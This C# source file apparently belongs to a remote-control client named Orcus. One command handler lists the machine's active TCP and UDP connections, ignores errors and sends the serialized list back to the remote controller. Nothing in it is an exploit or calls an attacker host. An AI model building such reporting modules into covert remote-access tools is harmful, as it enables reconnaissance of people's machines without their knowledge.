using System;
using System.Collections.Generic;
using Orcus.Plugins;
using Orcus.Shared.Commands.ActiveConnections;
using Orcus.Shared.NetSerializer;

namespace Orcus.Commands.ActiveConnections
{
    internal class ActiveConnectionsCommand : Command
    {
        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            var connections = new List<ActiveConnection>();
            try
            {
                connections.AddRange(Connections.GetTcpConnections());
            }
            catch (Exception)
            {
                // ignored
            }

            try
            {
                connections.AddRange(Connections.GetUdpConnections());
            }
            catch (Exception)
            {
                // ignored
            }

            var serializer = new Serializer(typeof (List<ActiveConnection>));
            connectionInfo.CommandResponse(this, serializer.Serialize(connections));
        }

        protected override uint GetId()
        {
            return 0;
        }
    }
}